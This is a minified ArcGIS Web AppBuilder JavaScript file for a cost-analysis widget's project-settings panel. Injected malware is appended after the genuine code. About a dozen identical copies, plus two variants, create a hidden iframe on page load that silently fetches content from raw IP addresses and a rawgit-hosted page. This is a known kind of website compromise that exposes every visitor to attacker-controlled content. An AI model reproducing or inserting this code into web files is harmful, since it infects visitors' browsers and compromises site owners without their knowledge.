// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/setting/ProjectSettings.html":'\x3cdiv\x3e\r\n\t\x3cfieldset class\x3d"esriCTFieldSet"\x3e\r\n\t\t\x3clegend class\x3d"esriCTFieldSetLegend"\x3e\r\n\t\t\t${nls.projectSettings.costingGeometrySectionTitle}\r\n\t\t\x3c/legend\x3e\r\n\t\t\x3cdiv class\x3d"esriCTNote esriCTFullWidth"\x3e${nls.projectSettings.costingGeometrySectionNote}\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Costing Geometry Layer Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.costingGeometryLayerLabel}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.costingGeometryLayerLabel}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Costing Geometry Later Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer" data-dojo-attach-point\x3d"costingGeometryLayerDropDown" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"costingGeometryHelp"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Field to Label Geography Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.fieldLabelGeography}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.fieldLabelGeography}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Field to Label Geography Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer" data-dojo-attach-point\x3d"fieldToLabelGeography" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"fieldToLabelGeographyHelp"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/fieldset\x3e\r\n\t\x3cfieldset class\x3d"esriCTFieldSet"\x3e\r\n\t\t\x3clegend class\x3d"esriCTFieldSetLegend"\x3e\r\n\t\t\t${nls.projectSettings.projectTableSectionTitle}\r\n\t\t\x3c/legend\x3e\r\n\t\t\x3cdiv class\x3d"esriCTNote esriCTFullWidth"\x3e${nls.projectSettings.projectTableSectionNote}\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Project Assets Table Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.projectAssetsTableLabel}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.projectAssetsTableLabel}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Project Assets Table Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer" data-dojo-attach-point\x3d"projectAssetsTable" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"projectAssetsTableHelp"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Project Multiplier Additional Cost Table Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.projectMultiplierTableLabel}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.projectMultiplierTableLabel}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Project Multiplier Additional Cost Table Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer" data-dojo-attach-point\x3d"projectMultiplierTable" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"projectMultiplierTableHelp"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Project Layer Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.projectLayerLabel}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.projectLayerLabel}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Project Layer Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer esriCTProjectLayerDropdown" data-dojo-attach-point\x3d"projectLayerDropDown" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"projectLayerHelp"\x3e\x3c/div\x3e\r\n\t\t\t\x3c!--Configure Fields Settings--\x3e\r\n\t\t\t\x3cdiv class\x3d"esriCTConfigureFieldsContainer"\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3c!--Configured Fields Table--\x3e\r\n\t\t\x3cdiv class\x3d"esriCTConfiguredFieldsTable esriCTHidden" data-dojo-attach-point\x3d"configuredFieldsTable"\x3e\x3c/div\x3e\r\n\t\x3c/fieldset\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/text!./ProjectSettings.html dojo/_base/lang dojo/on dojo/_base/array dojo/Evented dojo/string esri/layers/FeatureLayer dojo/promise/all dojo/Deferred jimu/dijit/CheckBox".split(" "),function(l,m,n,p,c,e,g,q,k,r,t,u){return l([m,n,q],{baseClass:"jimu-widget-cost-analysis-project-settings",templateString:p,_configuredFieldsTable:null,_prevCostingGeometryLayerValue:"",_prevProjectLayerValue:"",_prevProjectAssetsTableValue:"",
_prevProjectMultiplierTableValue:"",_defaultSelectOption:{},_assetsTableRequiredFields:{},_multiplierTableRequiredFields:{},constructor:function(a){c.mixin(this,a)},postMixInProperties:function(){this.nls.common={};c.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this._configuredFieldsTable=null;this._prevProjectMultiplierTableValue=this._prevProjectAssetsTableValue=this._prevProjectLayerValue=this._prevCostingGeometryLayerValue="";this.own(e(this.costingGeometryHelp,"click",
c.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.costingGeometryHelp)})));this.own(e(this.fieldToLabelGeographyHelp,"click",c.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.fieldToLabelGeographyHelp)})));this.own(e(this.projectAssetsTableHelp,"click",c.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.projectAssetsTableHelp)})));this.own(e(this.projectMultiplierTableHelp,"click",c.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.projectMultiplierTableHelp)})));
this.own(e(this.projectLayerHelp,"click",c.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.projectLayerHelp)})));this._assetsTableRequiredFields={ASSETGUID:["esriFieldTypeGUID"],COSTEQUATION:["esriFieldTypeString"],SCENARIO:["esriFieldTypeString"],TEMPLATENAME:["esriFieldTypeString"],GEOGRAPHYGUID:["esriFieldTypeGUID"],PROJECTGUID:["esriFieldTypeGUID"]};this._multiplierTableRequiredFields={DESCRIPTION:["esriFieldTypeString"],TYPE:["esriFieldTypeString"],VALUE:["esriFieldTypeDouble",
"esriFieldTypeSingle"],COSTINDEX:["esriFieldTypeSmallInteger","esriFieldTypeInteger"],PROJECTGUID:["esriFieldTypeGUID"]};this._defaultSelectOption={value:"",label:this.nls.projectSettings.selectLabel};this.inherited(arguments);this._init()},getConfig:function(){return{costingGeometryLayer:this._prevCostingGeometryLayerValue,geographyField:this.fieldToLabelGeography.value,assetTable:this._prevProjectAssetsTableValue,multiplierAdditionalCostTable:this._prevProjectMultiplierTableValue,projectLayer:this._prevProjectLayerValue}},
validate:function(){var a,b;a=!0;b="";""===this._prevProjectAssetsTableValue&&""===this._prevProjectMultiplierTableValue&&""===this._prevProjectLayerValue||""!==this._prevProjectAssetsTableValue&&""!==this._prevProjectMultiplierTableValue&&""!==this._prevProjectLayerValue||(b=[],""===this._prevProjectAssetsTableValue&&b.push(this.nls.projectSettings.projectAssetsTableLabel),""===this._prevProjectMultiplierTableValue&&b.push(this.nls.projectSettings.projectMultiplierTableLabel),""===this._prevProjectLayerValue&&
b.push(this.nls.projectSettings.projectLayerLabel),b=b.join(" and "),a=!1,b=k.substitute(this.nls.projectSettings.errorMessages.invalidConfiguration,{fieldsString:c.trim(b)}));return{isValid:a,errorMessage:b}},_init:function(){var a,b,d;a=[];b=[];d=[];this.map&&this.map.itemInfo&&this.map.itemInfo.itemData&&(this.map.itemInfo.itemData.operationalLayers&&0<this.map.itemInfo.itemData.operationalLayers.length&&(a=this.map.itemInfo.itemData.operationalLayers),this.map.itemInfo.itemData.tables&&0<this.map.itemInfo.itemData.tables.length&&
(b=this.map.itemInfo.itemData.tables));this._filterValidLayersForDropDown(a);g.forEach(b,c.hitch(this,function(a){var b=new u;d.push(b);a=new r(a.url);e(a,"load",c.hitch(this,function(a){g.forEach(this.map.itemInfo.itemData.tables,c.hitch(this,function(b){if(b.url===a.layer.url)return a.layer.id=b.id,a.layer.title=b.title,!0}));b.resolve(a.layer)}))}));t(d).then(c.hitch(this,function(a){this._populateTablesForDropDown(a)}));e(this.fieldToLabelGeography,"change",c.hitch(this,function(a){this.emit("onGeographyFieldChange",
a,this.costingGeometryLayerDropDown.getValue())}));this._attachingEvents();this._setConfig()},_filterValidLayersForDropDown:function(a){var b,d;b=[this._defaultSelectOption];d=[this._defaultSelectOption];this._costingGeometryLayerFieldOptions={defaultSelectOption:{options:[this._defaultSelectOption]}};a=a&&0<a.length?this._getLayerOptions(a,b,d):{costingGeometryLayerOptions:b,projectLayerOptions:d};this.costingGeometryLayerDropDown.set("options",c.clone(a.costingGeometryLayerOptions));this.projectLayerDropDown.set("options",
c.clone(a.projectLayerOptions))},_getLayerOptions:function(a,b,d){var f;g.forEach(a,c.hitch(this,function(a){if(a.layerObject&&a.layerObject.capabilities)f=a.layerObject.capabilities;else return!0;"esriGeometryPolygon"===a.layerObject.geometryType&&-1<f.indexOf("Query")&&this._hasGlobalIDField(a)&&(b.push({value:a.id,label:a.title}),"ArcGISFeatureLayer"===a.layerType&&(-1<f.indexOf("Editing")||-1<f.indexOf("Update"))&&-1<f.indexOf("Create")&&-1<f.indexOf("Delete")&&this._isValidProjectLayer(a)&&d.push({value:a.id,
label:a.title}))}));return{costingGeometryLayerOptions:b,projectLayerOptions:d}},_isValidProjectLayer:function(a){var b,d,f,c,h;c=["esriFieldTypeDouble","esriFieldTypeSingle"];a=a.layerObject.fields;f=[];for(b in a)h=a[b].type,d=a[b].name.toUpperCase(),("PROJECTNAME"===d&&"esriFieldTypeString"===h||"DESCRIPTION"===d&&"esriFieldTypeString"===h||"TOTALASSETCOST"===d&&-1<c.indexOf(h)||"GROSSPROJECTCOST"===d&&-1<c.indexOf(h)||"esriFieldTypeGlobalID"===h)&&f.push(d);return 5===f.length?!0:!1},_hasGlobalIDField:function(a){var b;
b=!1;(a=a.layerObject.fields||a.fields)&&0<a.length&&g.some(a,c.hitch(this,function(a){if("esriFieldTypeGlobalID"===a.type)return b=!0}));return b},_populateTablesForDropDown:function(a){var b,d;b=[this._defaultSelectOption];d=[this._defaultSelectOption];a&&0<a.length&&g.forEach(a,c.hitch(this,function(a){this._isValidTable(a,"projectAssets")&&b.push({value:a.id||a.name,label:a.title||a.name});this._isValidTable(a,"projectMultiplier")&&d.push({value:a.id||a.name,label:a.title||a.name})}));this.projectAssetsTable.addOption(c.clone(b));
this.projectMultiplierTable.addOption(c.clone(d));this._setSelectedValuesInTables()},_isValidTable:function(a,b){var d,f,e=[];d=!1;(a=a.fields)&&0<a.length&&g.some(a,c.hitch(this,function(a){f=a.name.toUpperCase();if("projectAssets"===b&&this._assetsTableRequiredFields[f]&&-1<this._assetsTableRequiredFields[f].indexOf(a.type)&&!a.domain){if(e.push(a.name),e.length===Object.keys(this._assetsTableRequiredFields).length)return d=!0}else if("projectMultiplier"===b&&this._multiplierTableRequiredFields[f]&&
-1<this._multiplierTableRequiredFields[f].indexOf(a.type)&&!a.domain&&(e.push(a.name),e.length===Object.keys(this._multiplierTableRequiredFields).length))return d=!0}));return d},_setSelectedValuesInTables:function(){var a;this.config.assetTable?(a=this.layerInfosObj.getTableInfoById(this.config.assetTable))&&a.layerObject?(this.projectAssetsTable.set("value",this.config.assetTable),this._prevProjectAssetsTableValue=this.config.assetTable):(this.projectAssetsTable.set("value",""),this._prevProjectAssetsTableValue=
""):(this.projectAssetsTable.set("value",""),this._prevProjectAssetsTableValue="");this.config.multiplierAdditionalCostTable?(a=this.layerInfosObj.getTableInfoById(this.config.multiplierAdditionalCostTable))&&a.layerObject?(this.projectMultiplierTable.set("value",this.config.multiplierAdditionalCostTable),this._prevProjectMultiplierTableValue=this.config.multiplierAdditionalCostTable):(this.projectMultiplierTable.set("value",""),this._prevProjectMultiplierTableValue=""):(this.projectMultiplierTable.set("value",
""),this._prevProjectMultiplierTableValue="")},_setConfig:function(){var a;this.config.costingGeometryLayer&&this.layerInfosObj.getLayerInfoById(this.config.costingGeometryLayer)&&(a=this.layerInfosObj.getLayerInfoById(this.config.costingGeometryLayer).layerObject);a?(this.costingGeometryLayerDropDown.set("value",this.config.costingGeometryLayer),this._prevCostingGeometryLayerValue=this.config.costingGeometryLayer,this._createCostingGeometryLayerFieldOptions(a,this._costingGeometryLayerFieldOptions),
this.fieldToLabelGeography.options=[],this.fieldToLabelGeography.options.length=0,this.config.geographyField?(this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions[this.config.costingGeometryLayer].options),this.fieldToLabelGeography.set("disabled",!1)):(this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions.defaultSelectOption.options),this.fieldToLabelGeography.set("disabled",!0))):(this.costingGeometryLayerDropDown.set("value",""),this._prevCostingGeometryLayerValue=
"",this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions.defaultSelectOption.options),this.fieldToLabelGeography.set("disabled",!0),this.fieldToLabelGeography.set("value",""));this.config.projectLayer?(this.projectLayerDropDown.set("value",this.config.projectLayer),this._prevProjectLayerValue=this.config.projectLayer):(this.projectLayerDropDown.set("value",""),this._prevProjectLayerValue="")},_attachingEvents:function(){this.own(e(this.costingGeometryLayerDropDown,"change",
c.hitch(this,function(a){a!==this.costingGeometryLayerDropDown.value&&this.costingGeometryLayerDropDown.set("value",a);""===a||this._costingGeometryLayerFieldOptions[a]||(a=this.layerInfosObj.getLayerInfoById(a).layerObject,this._createCostingGeometryLayerFieldOptions(a,this._costingGeometryLayerFieldOptions));this._onDropdownChange(this.costingGeometryLayerDropDown,"costingGeometryLayer","layer")})));this.own(e(this.projectLayerDropDown,"change",c.hitch(this,function(){this._onDropdownChange(this.projectLayerDropDown,
"projectLayer","layer")})));this.own(e(this.projectAssetsTable,"change",c.hitch(this,function(){this._onDropdownChange(this.projectAssetsTable,"projectAssets","table")})));this.own(e(this.projectMultiplierTable,"change",c.hitch(this,function(){this._onDropdownChange(this.projectMultiplierTable,"projectMultiplier","table")})))},_onDropdownChange:function(a,b,d){("layer"===d?this._validateDuplicateSelection(a,this.projectLayerDropDown,this.costingGeometryLayerDropDown):this._validateDuplicateSelection(a,
this.projectAssetsTable,this.projectMultiplierTable))?this._setNewDropdownValue(a,b):this._restorePreviousDropdownValue(a,b)},_validateDuplicateSelection:function(a,b,d){return a.value&&b.value===d.value?(a=k.substitute(this.nls.projectSettings.errorMessages.duplicateLayerSelection,{layerName:c.trim(a.tableNode.innerText)}),this.emit("onDuplicateLayerSelect",a),!1):!0},_setNewDropdownValue:function(a,b){switch(b){case "costingGeometryLayer":this._onCostingGeometryLayerDropDownChange();this._prevCostingGeometryLayerValue!==
a.value&&(this.emit("onLayerSelected",{lastSelectedId:this._prevCostingGeometryLayerValue,currentSelectedLayerId:a.value}),this.emit("onGeographyFieldChange",this.fieldToLabelGeography.get("value"),this.costingGeometryLayerDropDown.get("value")),this._prevCostingGeometryLayerValue=a.value);break;case "projectLayer":this._onProjectLayerDropDownChange();this._prevProjectLayerValue!==a.value&&(this.emit("onLayerSelected",{lastSelectedId:this._prevProjectLayerValue,currentSelectedLayerId:a.value}),this._prevProjectLayerValue=
a.value);break;case "projectAssets":this._prevProjectAssetsTableValue=a.value;break;case "projectMultiplier":this._prevProjectMultiplierTableValue=a.value}},_restorePreviousDropdownValue:function(a,b){switch(b){case "costingGeometryLayer":a.set("value",this._prevCostingGeometryLayerValue);break;case "projectLayer":a.set("value",this._prevProjectLayerValue);break;case "projectAssets":a.set("value",this._prevProjectAssetsTableValue);break;case "projectMultiplier":a.set("value",this._prevProjectMultiplierTableValue)}},
_createCostingGeometryLayerFieldOptions:function(a,b){var d;d=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble","esriFieldTypeString"];a&&a.fields&&0<a.fields.length?(b[a.id]||(b[a.id]={},b[a.id].options=[]),g.forEach(a.fields,c.hitch(this,function(c){-1<d.indexOf(c.type)&&b[a.id].options.push({value:c.name,label:c.alias?c.alias:c.name})}))):b[a.id].options.push([this._defaultSelectOption])},_onCostingGeometryLayerDropDownChange:function(){var a;this.fieldToLabelGeography.options=
[];this.fieldToLabelGeography.options.length=0;a=this.costingGeometryLayerDropDown.value;""!==a?(this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions[a].options),this.fieldToLabelGeography.set("disabled",!1)):(this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions.defaultSelectOption.options),this.fieldToLabelGeography.set("disabled",!0));this.config.geographyField?this.fieldToLabelGeography.set("value",this.config.geographyField,!1):this.fieldToLabelGeography.set("value",
"",!1)},_onProjectLayerDropDownChange:function(){var a,b;a={idFieldOptions:[this._defaultSelectOption],stringFieldOptions:[this._defaultSelectOption],costFieldOptions:[this._defaultSelectOption]};this.projectLayerDropDown.value&&(b=this.layerInfosObj.getLayerInfoById(this.projectLayerDropDown.value).layerObject,a=this._getTableDropdownOptions(b.fields,a))},_getTableDropdownOptions:function(a,b){var d,f,e;d=["esriFieldTypeOID","esriFieldTypeGlobalID"];f=["esriFieldTypeSmallInteger","esriFieldTypeInteger",
"esriFieldTypeSingle","esriFieldTypeDouble"];g.forEach(a,c.hitch(this,function(a){e={value:a.name,label:a.alias?a.alias:a.name};-1<d.indexOf(a.type)?b.idFieldOptions.push(e):-1<f.indexOf(a.type)?b.costFieldOptions.push(e):"esriFieldTypeString"===a.type&&b.stringFieldOptions.push(e)}));return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});